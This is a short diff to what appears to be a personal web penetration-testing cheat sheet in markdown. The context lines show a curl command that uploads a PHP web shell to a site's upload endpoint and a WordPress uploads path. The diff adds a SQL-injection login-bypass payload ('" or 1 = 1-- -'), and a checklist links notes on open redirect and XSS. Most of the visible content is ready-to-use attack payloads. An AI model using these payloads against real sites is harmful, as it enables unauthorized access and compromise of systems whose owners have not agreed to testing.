@@ -110,6 +110,11 @@ echo "<pre>$output</pre>";
 - __`<url>/wp-content/uploads`__
 - __`curl -F "Filedata=@./shell.php" <url_of_upload>`__
 
+## Login bypass
+ ```
+" or 1 = 1-- -
+```
+
 # Check list
 - [x] [Open redirect](open_redirect.md)
 - [x] [Cross-Site Scripting (XSS)](xss.md)
